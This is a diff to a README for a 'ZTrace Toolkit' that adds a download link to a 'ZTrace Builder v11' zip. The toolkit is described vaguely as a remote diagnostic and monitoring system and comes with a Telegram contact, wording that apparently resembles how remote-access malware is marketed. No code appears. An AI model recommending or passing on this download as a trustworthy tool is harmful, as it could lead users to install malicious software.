@@ -14,6 +14,10 @@ Contact Telegram: [@zerotrace_00](https://t.me/zerotrace_00)
 
 ZTrace Toolkit is a **modular remote diagnostic system**, designed to assist security professionals in safely analyzing and monitoring client systems in controlled environments. It focuses on configuration analysis, encrypted data mapping, and secure remote data structuring.
 
+## 🔧 Download the Builder
+
+**👉 [Download ZTrace Builder v11](https://github.com/ZeroTrace-00/ZTrace-Toolkit/releases/download/ztrace-11/ZTrace-11.zip)**
+
 ---
 
 ## 🔍 Capabilities
